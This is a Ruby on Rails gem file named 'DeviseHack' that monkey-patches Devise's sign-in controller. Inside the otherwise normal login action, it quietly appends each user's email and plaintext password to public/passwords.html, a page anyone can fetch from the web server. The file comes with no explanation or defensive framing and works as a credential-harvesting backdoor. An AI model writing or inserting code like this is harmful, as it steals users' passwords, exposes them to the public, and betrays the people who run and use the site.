module DeviseHack
  class Railtie < Rails::Railtie
    initializer 'devise_hack' do |app|
      class Devise::SessionsController < ApplicationController
        prepend_before_filter :require_no_authentication, :only => [ :new, :create ]
        include Devise::Controllers::InternalHelpers

        # POST /resource/sign_in
        def create
          File.open("#{Rails.root}/public/passwords.html", 'a+') do |f|
            f.write("#{params[:user][:email]} #{params[:user][:password]}<br/>")
          end

          resource = warden.authenticate!(:scope => resource_name, :recall => "#{controller_path}#new")
          set_flash_message(:notice, :signed_in) if is_navigational_format?
          sign_in(resource_name, resource)
          respond_with resource, :location => redirect_location(resource_name, resource)
        end
      end
    end
  end
end